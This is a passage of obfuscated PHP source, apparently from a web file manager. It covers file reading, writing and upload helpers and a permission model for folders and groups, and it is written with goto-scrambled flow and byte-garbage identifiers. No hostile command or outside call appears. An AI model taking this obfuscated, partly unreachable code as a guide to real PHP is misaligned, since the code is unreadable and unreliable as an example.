$EëÓ∏◊‹¥› .= fread($D«ïåú‡úÒ, $Fﬂµ÷ûﬁ∏); fclose($D«ïåú‡úÒ); goto CíπÎæºÚÉ; D‘Ñˆ„ÃÕò: if ($CŸ è§Ë‹ê <= $Fﬂµ÷ûﬁ∏ * $Eö—äÍüÌÕ) { return $this->hashMd5($Eﬁ´á™¨ÁÈ) . $CŸ è§Ë‹ê; } $EëÓ∏◊‹¥› = $eÚ„”«Ô”É[33]; $F‰†…∂±Óá = intval($CŸ è§Ë‹ê / $Eö—äÍüÌÕ); goto dÌ¥®π…ñÓ; CíπÎæºÚÉ: return md5($EëÓ∏◊‹¥›) . $CŸ è§Ë‹ê; goto dÊ¯Ìöƒ´ê; fﬁàÇΩ∏â£: $eÚ„”«Ô”É =& $_SERVER[Æ¡î¢≠¯™]; if (!$Eﬁ´á™¨ÁÈ) { return md5($eÚ„”«Ô”É[33]); } $Eﬁ´á™¨ÁÈ = $this->iconvSystem($Eﬁ´á™¨ÁÈ); goto dÂøãΩ¨ﬂë; dÊ¯Ìöƒ´ê: } public function getContent($eÃ†°Ô’ã±) { $eÃ†°Ô’ã± = $this->iconvSystem($eÃ†°Ô’ã±); return file_get_contents($eÃ†°Ô’ã±); } public function setContent($eçˆŒ ªé©, $CÍ¿Ú∫ƒâÃ = '') { $eçˆŒ ªé© = $this->iconvSystem($eçˆŒ ªé©); @file_put_contents($eçˆŒ ªé©, $CÍ¿Ú∫ƒâÃ, LOCK_EX); clearstatcache(); return strlen($CÍ¿Ú∫ƒâÃ) == filesize($eçˆŒ ªé©); } public function fileSubstr($e§Ê¢µÓ§Ù, $fÏ’œêéç• = 0, $CÍÇﬂ£ïÇò = false) { goto eêÉπúì¨«; eêÉπúì¨«: $DŸ⁄ıßÁü‰ =& $_SERVER[Æ¡î¢≠¯™]; $e§Ê¢µÓ§Ù = $this->iconvSystem($e§Ê¢µÓ§Ù); if ($CÍÇﬂ£ïÇò === !1) { $CÍÇﬂ£ïÇò = $this->size($e§Ê¢µÓ§Ù); } goto fá©´µÆ≥; fá©´µÆ≥: if ($CÍÇﬂ£ïÇò <= 0) { return $DŸ⁄ıßÁü‰[33]; } $bêÌë‹©Õø = fopen($e§Ê¢µÓ§Ù, $DŸ⁄ıßÁü‰[1148]); if (!$bêÌë‹©Õø) { return !1; } goto bÕ¯Ô≥Ü®Ÿ; bÕ¯Ô≥Ü®Ÿ: fseek($bêÌë‹©Õø, $fÏ’œêéç•); $e†Ë∆ë±ÔΩ = fread($bêÌë‹©Õø, $CÍÇﬂ£ïÇò); fclose($bêÌë‹©Õø); goto AÑçÈ®¢µ‚; AÑçÈ®¢µ‚: return $e†Ë∆ë±ÔΩ; goto AñïΩπ∞áã; AñïΩπ∞áã: } public function upload($aó‘Ì‰“ß, $F˜Ùíõàú¢, $aí…ƒèèìá = false, $e§»∂üà◊ = REPEAT_REPLACE) { $d≈Ê–å≈ôí = $this->copyFile($F˜Ùíõàú¢, $aó‘Ì‰“ß); return $d≈Ê–å≈ôí ? $this->getPathOuter($aó‘Ì‰“ß) : !1; } public function download($BÖ¶∏âÍã„, $DÇîŸ”ºÎ≠) { return $this->iconvSystem($BÖ¶∏âÍã„); } } goto FÿÒ¥ ≤ØŒ; Bπ≠§õÙ≥π: function beforeShutdown() { Hook::trigger($_SERVER[âñö‚‚Ñ][36]); } $_SERVER[$_SERVER[âñö‚‚Ñ][37]] = BASIC_PATH; $_SERVER[$_SERVER[âñö‚‚Ñ][38]] = LIB_DIR; goto E°√â∫–à–; C©Ç£◊ïàﬁ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\143\x65\137\141\165\164\x68"; public function getAuth($E¿ÇùÙ¡‹â) { goto Fß™¡‚Ñ∞î; fá¢ı¯‹Ì∆: $Bá’Ÿì–ÜÜ = $this->field($dÖÍÇç‹Ôî)->order($F≥∑àäÆœ[372])->where($B•≠ë¥‰≥º)->select(); $b£∞¯î—˘ù = array(); foreach ($Bá’Ÿì–ÜÜ as $a¥“¶•‚»¢) { if (Model($F≥∑àäÆœ[2208])->listData($a¥“¶•‚»¢[$F≥∑àäÆœ[2189]])) { $b£∞¯î—˘ù[] = $a¥“¶•‚»¢; } } goto e§∆Í°àä“; Fß™¡‚Ñ∞î: $F≥∑àäÆœ =& $_SERVER[Æ¡î¢≠¯™]; $dÖÍÇç‹Ôî = $F≥∑àäÆœ[2207]; $B•≠ë¥‰≥º = array($F≥∑àäÆœ[374] => $E¿ÇùÙ¡‹â); goto fá¢ı¯‹Ì∆; e§∆Í°àä“: return $b£∞¯î—˘ù; goto BËì¥»ª∫∫; BËì¥»ª∫∫: } public function setAuth($CØá¥€‰Í·, $B¯«±ﬂöÕÓ) { goto b⁄Óß£˘éµ; c®÷Ÿ´™áß: $eÿË∆¢¡–¶ = 1; $eù§‹Ù∏’Ë = $c€Ó∞ÍÜÒè[$eˆûª√Üç°[460]]; if ($eù§‹Ù∏’Ë != $eÿË∆¢¡–¶) { $BØΩñàÁ≥¿ = array($eˆûª√Üç°[2061] => $eù§‹Ù∏’Ë); $D–ÇÊóæ´Õ = Model($eˆûª√Üç°[2135])->field($eˆûª√Üç°[1397])->where($BØΩñàÁ≥¿)->select(); $D–ÇÊóæ´Õ = array_to_keyvalue($D–ÇÊóæ´Õ, $eˆûª√Üç°[33], $eˆûª√Üç°[1397]); } goto D‡¥”æãÇﬁ; b⁄Óß£˘éµ: $eˆûª√Üç° =& $_SERVER[Æ¡î¢≠¯™]; $c€Ó∞ÍÜÒè = Model($eˆûª√Üç°[1096])->sourceInfo($CØá¥€‰Í·); if ($c€Ó∞ÍÜÒè[$eˆûª√Üç°[376]] != SourceModel::TYPE_GROUP) { return !1; } goto c®÷Ÿ´™áß; D‡¥”æãÇﬁ: $f¬˜ƒ∑◊ﬁ§ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $C“óı÷éó“ = array(); foreach ($B¯«±ﬂöÕÓ as $AÈ‹îπ¿èú) { if (!in_array($AÈ‹îπ¿èú[$eˆûª√Üç°[376]], $f¬˜ƒ∑◊ﬁ§)) { show_json(LNG($eˆûª√Üç°[2209]), !1); } if ($eù§‹Ù∏’Ë != $eÿË∆¢¡–¶) { if ($AÈ‹îπ¿èú[$eˆûª√Üç°[376]] == SourceModel::TYPE_GROUP) { } if ($AÈ‹îπ¿èú[$eˆûª√Üç°[460]] != 0 && !in_array($AÈ‹îπ¿èú[$eˆûª√Üç°[460]], $D–ÇÊóæ´Õ)) { } } if ($AÈ‹îπ¿èú[$eˆûª√Üç°[460]] == 0) { $AÈ‹îπ¿èú[$eˆûª√Üç°[376]] = SourceModel::TYPE_USER; } $C“óı÷éó“[] = array($eˆûª√Üç°[374] => $CØá¥€‰Í·, $eˆûª√Üç°[376] => intval($AÈ‹îπ¿èú[$eˆûª√Üç°[376]]), $eˆûª√Üç°[460] => intval($AÈ‹îπ¿èú[$eˆûª√Üç°[460]]), $eˆûª√Üç°[2189] => intval($AÈ‹îπ¿èú[$eˆûª√Üç°[2189]]) ? intval($AÈ‹îπ¿èú[$eˆûª√Üç°[2189]]) : 0, $eˆûª√Üç°[2190] => intval($AÈ‹îπ¿èú[$eˆûª√Üç°[2190]]) ? intval($AÈ‹îπ¿èú[$eˆûª√Üç°[2190]]) : -1); } goto dá‘ÓÃ¢Â∫; dá‘ÓÃ¢Â∫: $this->where(array($eˆûª√Üç°[388] => $CØá¥€‰Í·))->delete(); $this->addAll($C“óı÷éó“); return !0; goto D¬≥õ—É»œ; D¬≥õ—É»œ: } public function authClear($Fúø∆ã∏è›) { $cÙÓƒ˘“§É =& $_SERVER[Æ¡î¢≠¯™]; $a‘•∆®ÚºÇ = Model($cÙÓƒ˘“§É[1096])->sourceInfo($Fúø∆ã∏è›); $fºî˜∫Î≠¢ = array($Fúø∆ã∏è›); if ($a‘•∆®ÚºÇ[$cÙÓƒ˘“§É[375]] == $cÙÓƒ˘“§É[93]) { $E’Ù»À—¯ü = array($cÙÓƒ˘“§É[529] => array($cÙÓƒ˘“§É[487], $a‘•∆®ÚºÇ[$cÙÓƒ˘“§É[463]] . $Fúø∆ã∏è› . $cÙÓƒ˘“§É[488])); $fºî˜∫Î≠¢ = Model($cÙÓƒ˘“§É[1096])->field($cÙÓƒ˘“§É[388])->where($E’Ù»À—¯ü)->getField($cÙÓƒ˘“§É[374], !0); $fºî˜∫Î≠¢[] = $Fúø∆ã∏è›; } $this->where(array($cÙÓƒ˘“§É[388] => array($cÙÓƒ˘“§É[389], $fºî˜∫Î≠¢)))->delete(); return !0; } public function get($FÂ∏‡≠∏êë) { $fæë˘ƒÊ»Æ = $this->getSourceList(array($FÂ∏‡≠∏êë), !0); return $fæë˘ƒÊ»Æ[0]; } public function getSourceList($bªÀ≥êû¬†, $aÇﬂΩ‘êÓØ = false) { goto a∂—√¨‘ª™; a∂—√¨‘ª™: $c€˜º≤´Àê =& $_SERVER[Æ¡î¢≠¯™]; if (!$bªÀ≥êû¬†) { return array(); } $b·Õ«Âîî≠ = Model($c€˜º≤´Àê[1096]); goto CÁ¨ïﬂÍ·ı; CÁ¨ïﬂÍ·ı: if (!$aÇﬂΩ‘êÓØ) { $D”«≠«º¿ú = array($c€˜º≤´Àê[388] => array($c€˜º≤´Àê[389], $bªÀ≥êû¬†)); $aÇﬂΩ‘êÓØ = $b·Õ«Âîî≠->field($c€˜º≤´Àê[2210])->where($D”«≠«º¿ú)->select(); $aÇﬂΩ‘êÓØ = array_to_keyvalue($aÇﬂΩ‘êÓØ, $c€˜º≤´Àê[374]); } $AÎ‘Ç«õÀ≈ = $bªÀ≥êû¬†; foreach ($aÇﬂΩ‘êÓØ as $fÚá“¯üÉ’ => $dÁ–∂îêŸ¬) { $aı‘’¥ßæ… = $b·Õ«Âîî≠->parentLevelArray($dÁ–∂îêŸ¬[$c€˜º≤´Àê[463]]); $AÎ‘Ç«õÀ≈ = array_merge($AÎ‘Ç«õÀ≈, $aı‘’¥ßæ…, array($fÚá“¯üÉ’)); } goto CÊŒﬁÇõÙª; DìÁÇôÕåÉ: $D”«≠«º¿ú = array($c€˜º≤´Àê[388] => array($c€˜º≤´Àê[389], $AÎ‘Ç«õÀ≈)); $D™¥ÌÙ‰á≠ = $this->field($BÉ™¬∑ñú’)->where($D”«≠«º¿ú)->select(); $D™¥ÌÙ‰á≠ = array_to_keyvalue_group($D™¥ÌÙ‰á≠, $c€˜º≤´Àê[374]); goto d¥…ùàÏÂî; CÊŒﬁÇõÙª: $AÎ‘Ç«õÀ≈ = array_values(array_unique($AÎ‘Ç«õÀ≈)); if (!$AÎ‘Ç«õÀ≈) { return array(); } $BÉ™¬∑ñú’ = $c€˜º≤´Àê[2211]; goto DìÁÇôÕåÉ; d¥…ùàÏÂî: $D–í—Ç”©¿ = array(); foreach ($aÇﬂΩ‘êÓØ as $cÕ∆¡Î¥∫“ => $bàå≤Óåê¬) { $D–í—Ç”©¿[$cÕ∆¡Î¥∫“] = $this->makeSourceAuth($bàå≤Óåê¬, $D™¥ÌÙ‰á≠); } return $D–í—Ç”©¿; goto eáŸÑ≠÷◊™; eáŸÑ≠÷◊™: } public function authDeepCheck($B™‚úÜ‰ÛÉ, $eÙ§À®‘“á = false) { $fıÇ·πÓå‰ =& $_SERVER[Æ¡î¢≠¯™]; if (_get($GLOBALS, $fıÇ·πÓå‰[461])) { return !1; } $dÿç∞…ª≈à = $this->makeAuthDeep(); if (!in_array($B™‚úÜ‰ÛÉ, $dÿç∞…ª≈à)) { return !1; } return array($fıÇ·πÓå‰[382] => -1, $fıÇ·πÓå‰[422] => array($fıÇ·πÓå‰[390] => $fıÇ·πÓå‰[1017], $fıÇ·πÓå‰[2067] => $fıÇ·πÓå‰[472], $fıÇ·πÓå‰[391] => LNG($fıÇ·πÓå‰[2212]), $fıÇ·πÓå‰[2079] => $fıÇ·πÓå‰[2213])); } protected function makeAuthDeep() { goto C≠ûã ’Öì; A“¨Ø±π√ö: $Fò¶‹π∆ÒÉ = array_values(array_unique($Fò¶‹π∆ÒÉ)); $b˘ú∏¥û ú = $Fò¶‹π∆ÒÉ; foreach ($b˘ú∏¥û ú as $a›ﬁ¬å∑‡ﬂ) { $Bƒº”éö†æ = $cÏ≤¿‹•´Ã->getInfo($a›ﬁ¬å∑‡ﬂ); $DµÇÿøﬂ’ﬂ = $E‘∆‰äæ¡ˆ->parentLevelArray($Bƒº”éö†æ[$d≈ëàÓæ®[463]]); $Fò¶‹π∆ÒÉ = array_merge($Fò¶‹π∆ÒÉ, $DµÇÿøﬂ’ﬂ); } goto bﬂå‘éñäÀ; C≠ûã ’Öì: $d≈ëàÓæ® =& $_SERVER[Æ¡î¢≠¯™]; static $bËËŒ¡ò¢π = false; if ($bËËŒ¡ò¢π) { return $bËËŒ¡ò¢π; } goto eåÆÃ  Ëƒ; bÃ„˘ì«ßΩ: $Bá§÷…∆œî = Session::get($d≈ëàÓæ®[2173]); $Bá§÷…∆œî = array_to_keyvalue($Bá§÷…∆œî, $d≈ëàÓæ®[33], $d≈ëàÓæ®[2061]); $c›‡°‚Â∞ñ = array($d≈ëàÓæ®[376] => SourceModel::TYPE_USER, $d≈ëàÓæ®[460] => USER_ID); goto A¶Ïê—Òüï; bﬂå‘éñäÀ: $Fò¶‹π∆ÒÉ = array_values(array_unique($Fò¶‹π∆ÒÉ)); foreach ($Fò¶‹π∆ÒÉ as $a›ﬁ¬å∑‡ﬂ) { $Bƒº”éö†æ = $cÏ≤¿‹•´Ã->getInfo($a›ﬁ¬å∑‡ﬂ); $bËËŒ¡ò¢π[] = $Bƒº”éö†æ[$d≈ëàÓæ®[396]][$d≈ëàÓæ®[374]]; } $bËËŒ¡ò¢π = array_values(array_unique($bËËŒ¡ò¢π)); goto d’©⁄∆¶Ò˜; fìù¨Ö¶úº: $cäôÑ≠¬ÑÃ = array_to_keyvalue($D∫Éì¯≠√õ, $d≈ëàÓæ®[33], $d≈ëàÓæ®[374]); $bËËŒ¡ò¢π = array(); $Fò¶‹π∆ÒÉ = $Bá§÷…∆œî; goto d«øËÒÖöπ; d’©⁄∆¶Ò˜: return $bËËŒ¡ò¢π; goto cÏêªªº≥À; eåÆÃ  Ëƒ: $C·¯Ô‘ÕÇˆ = Model($d≈ëàÓæ®[2214])->listData(); $fÌ‡∆∆¡§ë = array(); foreach ($C·¯Ô‘ÕÇˆ as $EÃìéÌî˘®) { if ($EÃìéÌî˘®[$d≈ëàÓæ®[381]] == 0 && $EÃìéÌî˘®[$d≈ëàÓæ®[2081]] == $d≈ëàÓæ®[93]) { $fÌ‡∆∆¡§ë[] = $EÃìéÌî˘®[$d≈ëàÓæ®[372]]; } } goto bÃ„˘ì«ßΩ; A¶Ïê—Òüï: if ($Bá§÷…∆œî) { $c›‡°‚Â∞ñ = array(array($d≈ëàÓæ®[376] => SourceModel::TYPE_USER, $d≈ëàÓæ®[460] => USER_ID), array($d≈ëàÓæ®[376] => SourceModel::TYPE_GROUP, $d≈ëàÓæ®[460] => array($d≈ëàÓæ®[389], $Bá§÷…∆œî)), $d≈ëàÓæ®[902] => $d≈ëàÓæ®[2141]); } if ($fÌ‡∆∆¡§ë) { $c›‡°‚Â∞ñ = array($c›‡°‚Â∞ñ, $d≈ëàÓæ®[2189] => array($d≈ëàÓæ®[2215], $fÌ‡∆∆¡§ë)); } $D∫Éì¯≠√õ = $this->field($d≈ëàÓæ®[2216])->where($c›‡°‚Â∞ñ)->select(); goto fìù¨Ö¶úº; d«øËÒÖöπ: $E‘∆‰äæ¡ˆ = Model($d≈ëàÓæ®[1096]); $cÏ≤¿‹•´Ã = Model($d≈ëàÓæ®[462]); if ($cäôÑ≠¬ÑÃ) { $fá„‹™“ä = $E‘∆‰äæ¡ˆ->where(array($d≈ëàÓæ®[374] => array($d≈ëàÓæ®[389], $cäôÑ≠¬ÑÃ)))->select(); foreach ($fá„‹™“ä as $fèÆÉﬂ£äˆ) { $DµÇÿøﬂ’ﬂ = $E‘∆‰äæ¡ˆ->parentLevelArray($fèÆÉﬂ£äˆ[$d≈ëàÓæ®[463]]); $bËËŒ¡ò¢π = array_merge($bËËŒ¡ò¢π, $DµÇÿøﬂ’ﬂ); $Fò¶‹π∆ÒÉ[] = $fèÆÉﬂ£äˆ[$d≈ëàÓæ®[460]]; } } goto A“¨Ø±π√ö; cÏêªªº≥À: } private function makeSourceAuth($Dî≤ÒﬁéΩÊ, $e“›éöñç®) { goto Eó«Òﬂ‹‹∂; AñÎÑ˜°–í: $E‚Ωï”≠àÖ = array_merge(array($Dî≤ÒﬁéΩÊ[$eÜ£†èö¨«[374]]), array_reverse($E‚Ωï”≠àÖ)); $C£Ì¥≥´Æπ = !1; foreach ($E‚Ωï”≠àÖ as $bÁ÷ÔØÓû˘) { if (!isset($e“›éöñç®[$bÁ÷ÔØÓû˘])) { continue; } $e‹ë ∏ç‹À = $this->authMake($e“›éöñç®[$bÁ÷ÔØÓû˘]); if ($e‹ë ∏ç‹À[$eÜ£†èö¨«[422]]) { $C£Ì¥≥´Æπ = $e‹ë ∏ç‹À; break; } } goto b•„ùÖôáî; b•„ùÖôáî: if (!$C£Ì¥≥´Æπ) { $EäÉﬂ¶ñ±æ = array_to_keyvalue($EäÉﬂ¶ñ±æ, $eÜ£†èö¨«[2061]); $aΩ◊∫ŸòõÌ = $Dî≤ÒﬁéΩÊ[$eÜ£†èö¨«[460]]; $BÖ€ÓÌÍ„è = isset($EäÉﬂ¶ñ±æ[$aΩ◊∫ŸòõÌ]) ? $EäÉﬂ¶ñ±æ[$aΩ◊∫ŸòõÌ] : !1; if ($BÖ€ÓÌÍ„è) { $C£Ì¥≥´Æπ = array($eÜ£†èö¨«[2217] => intval($BÖ€ÓÌÍ„è[$eÜ£†èö¨«[381]][$eÜ£†èö¨«[381]]), $eÜ£†èö¨«[2218] => $BÖ€ÓÌÍ„è[$eÜ£†èö¨«[381]]); } } if ((!$C£Ì¥≥´Æπ || $C£Ì¥≥´Æπ[$eÜ£†èö¨«[382]] <= 0) && $Dî≤ÒﬁéΩÊ[$eÜ£†èö¨«[376]] == SourceModel::TYPE_GROUP) { $b◊≥ŒÊ±Øû = $this->authDeepCheck($Dî≤ÒﬁéΩÊ[$eÜ£†èö¨«[374]], $C£Ì¥≥´Æπ); if ($b◊≥ŒÊ±Øû) { $C£Ì¥≥´Æπ = $b◊≥ŒÊ±Øû; } } return $C£Ì¥≥´Æπ; goto FÔ˜Æ¥‹êœ; Eó«Òﬂ‹‹∂: $eÜ£†èö¨« =& $_SERVER[Æ¡î¢≠¯™]; $EäÉﬂ¶ñ±æ = Session::get($eÜ£†èö¨«[2173]); $E‚Ωï”≠àÖ = Model($eÜ£†èö¨«[1096])->parentLevelArray($Dî≤ÒﬁéΩÊ[$eÜ£†èö¨«[463]]); goto AñÎÑ˜°–í; FÔ˜Æ¥‹êœ: } public function authOwnerApply($f‚È•Áéô§) { goto cô‚ò§√å“; A€»âº˘§È: if (count($aÜÔùùêáÇ) == 0) { $aÜÔùùêáÇ = $this->authFolderOwnerGroup($f‚È•Áéô§[$eé†ÜîÙ»´[460]]); } $aÜÔùùêáÇ = array_unique($aÜÔùùêáÇ); if (AuthModel::authCheckRoot($f‚È•Áéô§[$eé†ÜîÙ»´[381]][$eé†ÜîÙ»´[382]])) { $aÜÔùùêáÇ[] = USER_ID; } goto b”‹óû∏ù˘; c√î∏Úπœ˜: $bΩ¥—æü—¥ = array(); $aÜÔùùêáÇ = array(); foreach ($f–¡™œ—ªê as $d…Ù¯ı††ﬁ => $BÉõ¡úëâ¿) { $C≈ß±Á‰çä = $this->authFolderOwnerUser($BÉõ¡úëâ¿); $bΩ¥—æü—¥[$d…Ù¯ı††ﬁ] = $C≈ß±Á‰çä; $aÜÔùùêáÇ = array_merge($aÜÔùùêáÇ, $C≈ß±Á‰çä[$eé†ÜîÙ»´[539]]); if ($C≈ß±Á‰çä[$eé†ÜîÙ»´[2220]]) { break; } } goto A€»âº˘§È; b”‹óû∏ù˘: $f‚È•Áéô§[$eé†ÜîÙ»´[381]][$eé†ÜîÙ»´[2221]] = Model($eé†ÜîÙ»´[478])->userListInfo($aÜÔùùêáÇ); return $f‚È•Áéô§; goto cÇ≈ã¨Õ»ﬁ; eÓÂ”øå¥ª: $d±ÊﬁÈ∑˘î = Model($eé†ÜîÙ»´[1096])->parentLevelArray($f‚È•Áéô§[$eé†ÜîÙ»´[463]]); $d±ÊﬁÈ∑˘î = array_merge(array($f‚È•Áéô§[$eé†ÜîÙ»´[374]]), array_reverse($d±ÊﬁÈ∑˘î)); $f¨ÏÂ‘¨œ™ = $eé†ÜîÙ»´[2211]; goto AâÌúÌà¬Ç; AâÌúÌà¬Ç: $d∑îÉ÷ˆÁÙ = array($eé†ÜîÙ»´[388] => array($eé†ÜîÙ»´[389], $d±ÊﬁÈ∑˘î)); $f–¡™œ—ªê = $this->field($f¨ÏÂ‘¨œ™)->where($d∑îÉ÷ˆÁÙ)->select(); $f–¡™œ—ªê = array_to_keyvalue_group($f–¡™œ—ªê, $eé†ÜîÙ»´[374]); goto c√î∏Úπœ˜; cô‚ò§√å“: $eé†ÜîÙ»´ =& $_SERVER[Æ¡î¢≠¯™]; if (empty($f‚È•Áéô§[$eé†ÜîÙ»´[381]]) || isset($f‚È•Áéô§[$eé†ÜîÙ»´[2219]]) && $f‚È•Áéô§[$eé†ÜîÙ»´[2219]]) { return $f‚È•Áéô§; } if (AuthModel::authCheckRoot($f‚È•Áéô§[$eé†ÜîÙ»´[381]][$eé†ÜîÙ»´[382]])) { return $f‚È•Áéô§; } goto eÓÂ”øå¥ª; cÇ≈ã¨Õ»ﬁ: } private function authFolderOwnerGroup($aÓ”€õ°ïÒ) { $E§≠≈°à˜õ =& $_SERVER[Æ¡î¢≠¯™]; $c…Ì©◊á‰Æ = Model($E§≠≈°à˜õ[2135])->where(array($E§≠≈°à˜õ[2061] => $aÓ”€õ°ïÒ))->select(); $D†óÇòä√∫ = array(); if (!$c…Ì©◊á‰Æ) { return $D†óÇòä√∫; } foreach ($c…Ì©◊á‰Æ as $f¥Ñˆé¯‡Ú) { $c¬ˆå’˘∏∏ = $this->authInfo($f¥Ñˆé¯‡Ú); if (AuthModel::authCheckRoot($c¬ˆå’˘∏∏[$E§≠≈°à˜õ[381]])) { $D†óÇòä√∫[] = $f¥Ñˆé¯‡Ú[$E§≠≈°à˜õ[1397]]; } } return $D†óÇòä√∫; } private function authFolderOwnerUser($Fß‰ÉÂµ”›) { $bãéÌáΩàÔ =& $_SERVER[Æ¡î¢≠¯™]; $fÌÛ¥òàÖŸ = array(); $eãÀ¶ˆÂ©É = !1; foreach ($Fß‰ÉÂµ”› as $f¿·£∑à≠Ë) { $C—É¡Ò€˘“ = $this->authInfo($f¿·£∑à≠Ë); if ($f¿·£∑à≠Ë[$bãéÌáΩàÔ[460]] == $bãéÌáΩàÔ[472]) { $eãÀ¶ˆÂ©É = !0; } if ($f¿·£∑à≠Ë[$bãéÌáΩàÔ[376]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($C—É¡Ò€˘“[$bãéÌáΩàÔ[381]])) { $fÌÛ¥òàÖŸ[] = $f¿·£∑à≠Ë[$bãéÌáΩàÔ[460]]; } } } return array($bãéÌáΩàÔ[539] => $fÌÛ¥òàÖŸ, $bãéÌáΩàÔ[2220] => $eãÀ¶ˆÂ©É); } public function authMake($Fæ≥à—èäà) { goto bÃ∏çÎÜÌë; Fæ÷éΩÿã≤: $E†—˘öô◊Û = 0; foreach ($Fæ≥à—èäà as $d†á…Óâí”) { $f∞äº¿ßŸƒ = $this->authInfo($d†á…Óâí”); $E€µáí≤‰å = $d†á…Óâí”[$cÏΩÏ´ì‹¡[460]]; $Eª˘π‹ÉΩœ = intval($f∞äº¿ßŸƒ[$cÏΩÏ´ì‹¡[381]]); if ($d†á…Óâí”[$cÏΩÏ´ì‹¡[376]] == SourceModel::TYPE_USER && $E€µáí≤‰å == USER_ID) { $f∏Íßµô±Ú = !0; $b•ø∫ÈÙØ¶ = $f∞äº¿ßŸƒ; $Aøƒ¯∆Õç• = $Eª˘π‹ÉΩœ; } else { if ($d†á…Óâí”[$cÏΩÏ´ì‹¡[376]] == SourceModel::TYPE_GROUP && in_array($E€µáí≤‰å, $CÁº–æ√©π)) { $d¡µÁ‰›¿Ÿ = !0; if ($Eª˘π‹ÉΩœ >= $bÑ öıâÂ§) { $bÑ öıâÂ§ = $Eª˘π‹ÉΩœ; $Búøﬁ©Ÿæï = $f∞äº¿ßŸƒ; } } else { if ($E€µáí≤‰å == $cÏΩÏ´ì‹¡[472]) { $E†—˘öô◊Û = !0; $cõ´ãëùïÊ = $f∞äº¿ßŸƒ; $Cƒªè§æõ§ = $Eª˘π‹ÉΩœ; } } } } $AŸµ±πÉºì = $f∏Íßµô±Ú ? $Aøƒ¯∆Õç• : ($d¡µÁ‰›¿Ÿ ? $bÑ öıâÂ§ : $Cƒªè§æõ§); goto b‚Ÿ…πıìé; b‚Ÿ…πıìé: $f∞äº¿ßŸƒ = $f∏Íßµô±Ú ? $b•ø∫ÈÙØ¶ : ($d¡µÁ‰›¿Ÿ ? $Búøﬁ©Ÿæï : $cõ´ãëùïÊ); $d‚ç‰à® ö = array($cÏΩÏ´ì‹¡[2217] => intval($AŸµ±πÉºì), $cÏΩÏ´ì‹¡[2218] => $f∞äº¿ßŸƒ); return $d‚ç‰à® ö; goto F€æè∆©â; dÉ“ÿ„ıú€: $cõ´ãëùïÊ = 0; $f∏Íßµô±Ú = 0; $d¡µÁ‰›¿Ÿ = 0; goto Fæ÷éΩÿã≤; bÃ∏çÎÜÌë: $cÏΩÏ´ì‹¡ =& $_SERVER[Æ¡î¢≠¯™]; if (!$Fæ≥à—èäà) { return array($cÏΩÏ´ì‹¡[382] => 0, $cÏΩÏ´ì‹¡[422] => !1); } $DÏóµ ∫»ó = Session::get($cÏΩÏ´ì‹¡[2173]); goto B∏–∫Ô∑ø¨; B∏–∫Ô∑ø¨: $CÁº–æ√©π = array_to_keyvalue($DÏóµ ∫»ó, $cÏΩÏ´ì‹¡[33], $cÏΩÏ´ì‹¡[2061]); $Aøƒ¯∆Õç• = 0; $bÑ öıâÂ§ = 0; goto Eä⁄åé∆Õ; Eä⁄åé∆Õ: $Cƒªè§æõ§ = 0; $b•ø∫ÈÙØ¶ = 0; $Búøﬁ©Ÿæï = 0; goto dÉ“ÿ„ıú€; F€æè∆©â: } public function authTargetInfoMake($D∞∫≈¬Í¥É) { goto Cﬁ©‡ØÃ‘⁄; dˆµçàòƒ¶: return array($B∑À∏¬–’Ñ[2222] => $cª»’≥ƒ–„, $B∑À∏¬–’Ñ[2223] => $Aò«ÿØΩÎ¡); goto EÖ”≤ÕûáÀ; Cﬁ©‡ØÃ‘⁄: $B∑À∏¬–’Ñ =& $_SERVER[Æ¡î¢≠¯™]; $cª»’≥ƒ–„ = array(); $Aò«ÿØΩÎ¡ = array(); goto dÊ‚ôòáÁ¢; dÊ‚ôòáÁ¢: foreach ($D∞∫≈¬Í¥É as $aÉîÜ»ı‚Ω) { if ($aÉîÜ»ı‚Ω[$B∑À∏¬–’Ñ[376]] == SourceModel::TYPE_USER) { $cª»’≥ƒ–„[] = intval($aÉîÜ»ı‚Ω[$B∑À∏¬–’Ñ[460]]); } else { if ($aÉîÜ»ı‚Ω[$B∑À∏¬–’Ñ[376]] == SourceModel::TYPE_GROUP) { $Aò«ÿØΩÎ¡[] = intval($aÉîÜ»ı‚Ω[$B∑À∏¬–’Ñ[460]]); } } } if ($cª»’≥ƒ–„) { $cª»’≥ƒ–„ = Model($B∑À∏¬–’Ñ[478])->userListInfo($cª»’≥ƒ–„); } if ($Aò«ÿØΩÎ¡) { $Aƒ†˜◊ˆÒé = array($B∑À∏¬–’Ñ[2133] => array($B∑À∏¬–’Ñ[389], $Aò«ÿØΩÎ¡)); $Aò«ÿØΩÎ¡ = Model($B∑À∏¬–’Ñ[462])->field($B∑À∏¬–’Ñ[2146])->where($Aƒ†˜◊ˆÒé)->select(); $Aò«ÿØΩÎ¡ = array_to_keyvalue($Aò«ÿØΩÎ¡, $B∑À∏¬–’Ñ[2061]); } goto dˆµçàòƒ¶; EÖ”≤ÕûáÀ: } private function authInfo($AÀ‹Øòø†) { $dæÿ¿Íùƒ÷ =& $_SERVER[Æ¡î¢≠¯™]; if ($AÀ‹Øòø†[$dæÿ¿Íùƒ÷[2189]]) { $a®ÌﬂüΩ“ = Model($dæÿ¿Íùƒ÷[2208])->listData($AÀ‹Øòø†[$dæÿ¿Íùƒ÷[2189]]); if (!$a®ÌﬂüΩ“) { return !1; $cæ™øêâã‘ = Model($dæÿ¿Íùƒ÷[2208])->listData(); $eÍﬁµÇôóª = array_filter_by_field($cæ™øêâã‘, $dæÿ¿Íùƒ÷[381], $dæÿ¿Íùƒ÷[472]); return $eÍﬁµÇôóª; } $e†…´Óœ’∞ = array_field_key($a®ÌﬂüΩ“, array($dæÿ¿Íùƒ÷[372], $dæÿ¿Íùƒ÷[28], $dæÿ¿Íùƒ÷[381], $dæÿ¿Íùƒ÷[2079], $dæÿ¿Íùƒ÷[2082])); $e†…´Óœ’∞[$dæÿ¿Íùƒ÷[2224]] = $AÀ‹Øòø†; return $e†…´Óœ’∞; } else { return array($dæÿ¿Íùƒ÷[390] => 0, $dæÿ¿Íùƒ÷[2067] => $AÀ‹Øòø†[$dæÿ¿Íùƒ÷[2190]], $dæÿ¿Íùƒ÷[391] => $dæÿ¿Íùƒ÷[33], $dæÿ¿Íùƒ÷[2079] => $dæÿ¿Íùƒ÷[2225]); } } } class SourceEventModel extends ModelBase { protected $tableName = 